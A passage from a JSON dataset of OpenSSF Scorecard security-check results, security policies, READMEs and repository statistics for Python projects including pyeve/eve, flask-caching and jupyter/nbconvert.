                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "Found 2/29 approved changesets -- score normalized to 0",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: txtnonymous contributor org/company found, RefUnite contributor org/company found, TheGivingLab contributor org/company found, PiPlot contributor org/company found, GameCraftLdn contributor org/company found, msmvps contributor org/company found, tomccitalia contributor org/company found, OP2 contributor org/company found, PyTables contributor org/company found, PYCONDE contributor org/company found, destream-py contributor org/company found, myself contributor org/company found, reactjs contributor org/company found, mnwd contributor org/company found, github contributor org/company found, StripeStore contributor org/company found, CoderDojoRavenna contributor org/company found, trainhack contributor org/company found, UCL contributor org/company found, inCliques contributor org/company found, checklisthq contributor org/company found, euruko2013 contributor org/company found, sourcefabric contributor org/company found, tinybird contributor org/company found, lithic.com contributor org/company found, CIR2000 contributor org/company found, DevRomagna contributor org/company found, cir 2000 contributor org/company found, coneoproject contributor org/company found, KohoVolit contributor org/company found, Tracely contributor org/company found, swissloop contributor org/company found, pyeve contributor org/company found, dev4good contributor org/company found, ChokePointProject contributor org/company found, SecondFriend contributor org/company found, deeplay-io contributor org/company found, amiv-eth contributor org/company found, ohdh14 contributor org/company found, google contributor org/company found, crunchdev contributor org/company found, taarifa contributor org/company found, CriticalCare contributor org/company found, firedrakeproject contributor org/company found, renewer contributor org/company found, superdesk contributor org/company found, tox-dev contributor org/company found, planetek hellas contributor org/company found, jazzband contributor org/company found, uscadt contributor org/company found, e-mergency contributor org/company found, imperialists contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 52 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Warn: no dependency update tool configurations found"
                    ],
                    "score": 0,
                    "reason": "no update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Warn: project license file does not contain an FSF or OSI license."
                    ],
                    "score": 9,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 6,
                    "reason": "8 commit(s) and 0 issue activity found in the last 90 days -- score normalized to 6",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Warn: no GitHub/GitLab publishing workflow detected."
                    ],
                    "score": -1,
                    "reason": "packaging workflow not detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:20: update your workflow using https://app.stepsecurity.io/secureworkflow/pyeve/eve/ci.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:21: update your workflow using https://app.stepsecurity.io/secureworkflow/pyeve/eve/ci.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ci.yml:24: update your workflow using https://app.stepsecurity.io/secureworkflow/pyeve/eve/ci.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ci.yml:27: update your workflow using https://app.stepsecurity.io/secureworkflow/pyeve/eve/ci.yml/master?enable=pin",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:35",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:36",
                        "Info:   0 out of   2 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of   2 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of   2 pipCommand dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Warn: 0 commits out of 3 are checked with a SAST tool"
                    ],
                    "score": 0,
                    "reason": "SAST tool is not run on all commits -- score normalized to 0",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: SECURITY.md:1",
                        "Warn: no linked content found",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: SECURITY.md:1",
                        "Info: Found text in security policy: SECURITY.md:1"
                    ],
                    "score": 4,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no releases found",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Warn: no topLevel permission defined: .github/workflows/ci.yml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "0 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/pyeve/eve/contents/SECURITY.md",
        "SecurityPolicy_content": "# Security Policy\n\n## Reporting a Vulnerability\n\nPlease email pyeve at nicolaiarocci dot com any vulnerability you may find about this project.\n",
        "project_all_labels": [
            "bug",
            "contributor friendly",
            "documentation",
            "documentation needed",
            "duplicate",
            "enhancement",
            "feature request",
            "help wanted",
            "more info needed",
            "on hold",
            "planned",
            "question",
            "sqlalchemy",
            "stale",
            "test coverage needed",
            "test/ci",
            "wip",
            "wontfix"
        ],
        "README_content": "Eve\n====\n.. image:: https://img.shields.io/pypi/v/eve.svg?style=flat-square\n    :target: https://pypi.org/project/eve\n\n.. image:: https://github.com/pyeve/eve/workflows/CI/badge.svg\n  :target: https://github.com/pyeve/eve/actions?query=workflow%3ACI\n\n.. image:: https://img.shields.io/pypi/pyversions/eve.svg?style=flat-square\n    :target: https://pypi.org/project/eve\n\n.. image:: https://img.shields.io/badge/license-BSD-blue.svg?style=flat-square\n    :target: https://en.wikipedia.org/wiki/BSD_License\n\n.. image:: https://img.shields.io/badge/code%20style-black-000000.svg\n    :target: https://github.com/ambv/black\n\nEve is an open source Python REST API framework designed for human beings. It\nallows to effortlessly build and deploy highly customizable, fully featured\nRESTful Web Services. Eve offers native support for MongoDB, and SQL backends\nvia community extensions.\n\nEve is Simple\n-------------\n.. code-block:: python\n\n    from eve import Eve\n\n    app = Eve()\n    app.run()\n\nThe API is now live, ready to be consumed:\n\n.. code-block:: console\n\n    $ curl -i http://example.com/people\n    HTTP/1.1 200 OK\n\nAll you need to bring your API online is a database, a configuration file\n(defaults to ``settings.py``) and a launch script.  Overall, you will find that\nconfiguring and fine-tuning your API is a very simple process.\n\n`Check out the Eve Website <http://python-eve.org/>`_\n\nFeatures\n--------\n* Emphasis on REST\n* Full range of CRUD operations\n* Customizable resource endpoints\n* Customizable, multiple item endpoints\n* Filtering and Sorting\n* Pagination\n* HATEOAS\n* JSON and XML Rendering\n* Conditional Requests\n* Data Integrity and Concurrency Control\n* Bulk Inserts\n* Data Validation\n* Extensible Data Validation\n* Resource-level Cache Control\n* API Versioning\n* Document Versioning\n* Authentication\n* CORS Cross-Origin Resource Sharing\n* JSONP\n* Read-only by default\n* Default Values\n* Predefined Database Filters\n* Projections\n* Embedded Resource Serialization\n* Event Hooks\n* Rate Limiting\n* Custom ID Fields\n* File Storage\n* GeoJSON\n* Internal Resources\n* Enhanced Logging\n* Operations Log\n* MongoDB Aggregation Framework\n* MongoDB and SQL Support\n* Powered by Flask\n\nFunding\n-------\nEve REST framework is a open source, collaboratively funded project. If you run\na business and are using Eve in a revenue-generating product, it would make\nbusiness sense to sponsor Eve development: it ensures the project that your\nproduct relies on stays healthy and actively maintained. Individual users are\nalso welcome to make a recurring pledge or a one time donation if Eve has\nhelped you in your work or personal projects.\n\nEvery single sign-up makes a significant impact towards making Eve possible. To\nlearn more, check out our `funding page`_.\n\nLicense\n-------\nEve is a `Nicola Iarocci`_ open source project,\ndistributed under the `BSD license\n<https://github.com/pyeve/eve/blob/master/LICENSE>`_.\n\n.. _`Nicola Iarocci`: http://nicolaiarocci.com\n.. _`funding page`: http://python-eve.org/funding.html\n",
        "num_commits": 3403,
        "project_age_days": 4390,
        "project_created_at": "2012-10-22",
        "latest_updated_at": "2024-10-29",
        "latest_pushed_at": "2024-10-15",
        "num_contributors": 166,
        "num_pull": 563,
        "num_issues": 1536,
        "num_opening_issue": 29,
        "project_size(kB)": 19367,
        "num_stargazers": 6710,
        "num_watchers": 6710,
        "num_forks": 744,
        "num_subscribers": 224,
        "SecurityPolicy_created_at": "2022-11-02 08:45:32",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "feb1df361210db9057bd45a2654f3c22bd6fc96c",
                "url": "https://github.com/pyeve/eve/commit/feb1df361210db9057bd45a2654f3c22bd6fc96c",
                "date": "2022-11-02 08:45:32"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "email",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Generic policy",
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": true
    },
    {
        "project_name": "sh4nks/flask-caching",
        "project_url": "https://github.com/sh4nks/flask-caching",
        "SSF": {
            "date": "2024-10-29T23:52:53+07:00",
            "repo": {
                "name": "github.com/sh4nks/flask-caching",
                "commit": "494d49882537a6cbcfe3cb41c4df05ae8acf60ce"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 5.1,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Warn: branch protection not enabled for branch 'master'"
                    ],
                    "score": 0,
                    "reason": "branch protection not enabled on development/release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 7,
                    "reason": "23 out of 30 merged PRs checked by a CI test -- score normalized to 7",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 5,
                    "reason": "Found 9/16 approved changesets -- score normalized to 5",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: pallets-eco contributor org/company found, lens contributor org/company found, msgpack contributor org/company found, fluent contributor org/company found, pytest-dev contributor org/company found, tractian contributor org/company found, atlassian contributor org/company found, KLab contributor org/company found, go-sql-driver contributor org/company found, deutsche telekom ag @telekom contributor org/company found, flaskbb contributor org/company found, benchmark.games contributor org/company found, PyMySQL contributor org/company found, klab inc contributor org/company found, requests contributor org/company found, python contributor org/company found, Homebrew contributor org/company found, lektor contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 18 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Info: detected update tool: Dependabot: .github/dependabot.yml:1"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Warn: project license file does not contain an FSF or OSI license."
                    ],
                    "score": 9,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "0 commit(s) and 0 issue activity found in the last 90 days -- score normalized to 0",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Warn: no GitHub/GitLab publishing workflow detected."
                    ],
                    "score": -1,
                    "reason": "packaging workflow not detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/lock.yaml:11: update your workflow using https://app.stepsecurity.io/secureworkflow/pallets-eco/flask-caching/lock.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/tests.yml:33: update your workflow using https://app.stepsecurity.io/secureworkflow/pallets-eco/flask-caching/tests.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/tests.yml:34: update your workflow using https://app.stepsecurity.io/secureworkflow/pallets-eco/flask-caching/tests.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/tests.yml:52: update your workflow using https://app.stepsecurity.io/secureworkflow/pallets-eco/flask-caching/tests.yml/master?enable=pin",
                        "Warn: pipCommand not pinned by hash: .github/workflows/tests.yml:45",
                        "Warn: pipCommand not pinned by hash: .github/workflows/tests.yml:46",
                        "Warn: pipCommand not pinned by hash: .github/workflows/tests.yml:47",
                        "Warn: pipCommand not pinned by hash: .github/workflows/tests.yml:57",
                        "Info:   0 out of   3 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of   1 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of   4 pipCommand dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Warn: 0 commits out of 30 are checked with a SAST tool"
                    ],
                    "score": 0,
                    "reason": "SAST tool is not run on all commits -- score normalized to 0",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: github.com/pallets-eco/.github/SECURITY.md:1",
                        "Info: Found linked content: github.com/pallets-eco/.github/SECURITY.md:1",
                        "Warn: One or no descriptive hints of disclosure, vulnerability, and/or timelines in security policy",
                        "Info: Found text in security policy: github.com/pallets-eco/.github/SECURITY.md:1"
                    ],
                    "score": 9,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no releases found",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Warn: no topLevel permission defined: .github/workflows/lock.yaml:1",
                        "Warn: no topLevel permission defined: .github/workflows/tests.yml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "0 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/pallets-eco/.github/contents/SECURITY.md",
        "SecurityPolicy_content": "# Security Policy\n\nIf you believe you have identified a security issue with a Pallets-Eco project,\n**do not open a public issue**. To responsibly report a security issue, use\nGitHub's [security advisory system][gh-docs]. From the project's repository,\nclick \"Security\" at the top, then click \"Advisories\" at the left, then click the\ngreen \"New draft security advisory\" button. Alternatively, you may email\n[security@palletsprojects.com](mailto:security@palletsprojects.com), and we will\nconvert that to a GitHub security advisory.\n\nBe sure to include as much detail as necessary in your report. As with reporting\nnormal issues, a minimal reproducible example will help the maintainers address\nthe issue faster. Information about why the issue is a security issue is also\nhelpful. If you are able, you may also provide a fix for the issue.\n\nA maintainer will reply acknowledging the report and how to continue. We will\nobtain a CVE id as well, please do not do this on your own. We will work with\nyou to attempt to understand the issue and decide on its validity. Maintainers\nare volunteers working in their free time, and therefore cannot guarantee any\nspecific timeline. Please be patient during this process.\n\nThe current feature release will receive security fixes. Fixes to older versions\nmay be considered based on usage information and severity, but are not\nguaranteed. After fixing an issue, we will make a new release.\n\n[gh-docs]: https://docs.github.com/en/code-security/security-advisories/working-with-repository-security-advisories/creating-a-repository-security-advisory\n",
        "project_all_labels": [
            "awaiting response",
            "backend",
            "bug",
            "cachelib integration",
            "dependencies",
            "documentation",
            "duplicate",
            "enhancement",
            "good first issue",
            "help wanted",
            "invalid",
            "needs info",
            "no response",
            "question",
            "release",
            "stale",
            "wontfix"
        ],
        "README_content": "Flask-Caching\n=============\n\nA fork of the `Flask-cache`_ extension which adds easy cache support to Flask.\n\n.. _Flask-cache: https://github.com/thadeusb/flask-cache\n\n\nInstalling\n----------\n\nInstall and update using `pip`_:\n\n.. code-block:: text\n\n    $ pip install -U flask-caching\n\n.. _pip: https://pip.pypa.io/en/stable/getting-started/\n\n\nDonate\n------\n\nThe Pallets organization develops and supports Flask and the libraries\nit uses. In order to grow the community of contributors and users, and\nallow the maintainers to devote more time to the projects, `please\ndonate today`_.\n\n.. _please donate today: https://palletsprojects.com/donate\n\n\nLinks\n-----\n\n-   Documentation: https://flask-caching.readthedocs.io\n-   Changes: https://flask-caching.readthedocs.io/en/latest/changelog.html\n-   PyPI Releases: https://pypi.org/project/Flask-Caching/\n-   Source Code: https://github.com/pallets-eco/flask-caching\n-   Issue Tracker: https://github.com/pallets-eco/flask-caching/issues\n-   Twitter: https://twitter.com/PalletsTeam\n-   Chat: https://discord.gg/pallets\n",
        "num_commits": 755,
        "project_age_days": 3039,
        "project_created_at": "2016-07-04",
        "latest_updated_at": "2024-10-13",
        "latest_pushed_at": "2024-08-01",
        "num_contributors": 96,
        "num_pull": 342,
        "num_issues": 578,
        "num_opening_issue": 77,
        "project_size(kB)": 1090,
        "num_stargazers": 894,
        "num_watchers": 894,
        "num_forks": 194,
        "num_subscribers": 17,
        "SecurityPolicy_created_at": "2024-02-09 20:30:27",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "694b7027e532f049c3c2e305f101af5eeae51af3",
                "url": "https://github.com/pallets-eco/.github/commit/694b7027e532f049c3c2e305f101af5eeae51af3",
                "date": "2024-02-09 20:30:27"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "email_advisory",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": false
    },
    {
        "project_name": "jupyter/nbconvert",
        "project_url": "https://github.com/jupyter/nbconvert",
        "SSF": {
            "date": "2024-10-29T21:22:26+07:00",
            "repo": {
                "name": "github.com/jupyter/nbconvert",
                "commit": "e1599627fd1f9e06d983e3974eadb58d2a92c44c"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 6.0,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'main'",
                        "Info: 'force pushes' disabled on branch 'main'",
                        "Warn: 'branch protection settings apply to administrators' is disable on branch 'main'",
                        "Warn: 'stale review dismissal' is disable on branch 'main'",
                        "Warn: branch 'main' does not require approvers",
                        "Warn: codeowners review is not required on branch 'main'",
                        "Warn: 'last push approval' is disable on branch 'main'",
                        "Warn: 'up-to-date branches' is disable on branch 'main'",
                        "Info: status check found to merge onto on branch 'main'",
                        "Info: PRs are required in order to make changes on branch 'main'"
                    ],
                    "score": 3,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "23 out of 23 merged PRs checked by a CI test -- score normalized to 10",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 4,
                    "reason": "Found 12/27 approved changesets -- score normalized to 4",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: netflix contributor org/company found, southampton-python contributor org/company found, jupytercad contributor org/company found, SoundScapeRenderer contributor org/company found, jupyterhealth contributor org/company found, pickleshare contributor org/company found, QuantStack contributor org/company found, geojupyter contributor org/company found, scikit-learn-contrib contributor org/company found, ipython-contrib contributor org/company found, RDFLib contributor org/company found, pyxg contributor org/company found, harvard t.h. chan school of public health contributor org/company found, machine-shop contributor org/company found, jupytergis contributor org/company found, erdc contributor org/company found, jupyter-native contributor org/company found, berkeley-cocosci contributor org/company found, widgetti contributor org/company found, bloomberg contributor org/company found, jupyterday-atlanta-2016 contributor org/company found, MeeseeksBox contributor org/company found, binder-project contributor org/company found, jupyterlab contributor org/company found, BIDS contributor org/company found, mongodb-labs contributor org/company found, amazon web services contributor org/company found, ssr-scenes contributor org/company found, vaultjs contributor org/company found, binder-examples contributor org/company found, scipy-latinamerica contributor org/company found, pypa contributor org/company found, matplotlib contributor org/company found, simula research laboratory contributor org/company found, jupyter4edu contributor org/company found, jupyterlite contributor org/company found, vaexio contributor org/company found, jupyterlab-contrib contributor org/company found, Maritime-Robotics-Student-Society contributor org/company found, jupyter-attic contributor org/company found, xonsh contributor org/company found, h5py contributor org/company found, zeromq contributor org/company found, jupyter-robotics contributor org/company found, plasmabio contributor org/company found, sipb contributor org/company found, spatialaudio contributor org/company found, WRSC contributor org/company found, xtensor-stack contributor org/company found, university of california berkeley. contributor org/company found, scikit-learn contributor org/company found, jupyter contributor org/company found, pygame contributor org/company found, networkx contributor org/company found, publictransit-in contributor org/company found, 2i2c-org contributor org/company found, scikit-image contributor org/company found, openhatch contributor org/company found, sandiegopython contributor org/company found, voila-dashboards contributor org/company found, simphony contributor org/company found, NYU-MSDSE-SWG contributor org/company found, ipython contributor org/company found, jupyter-widgets contributor 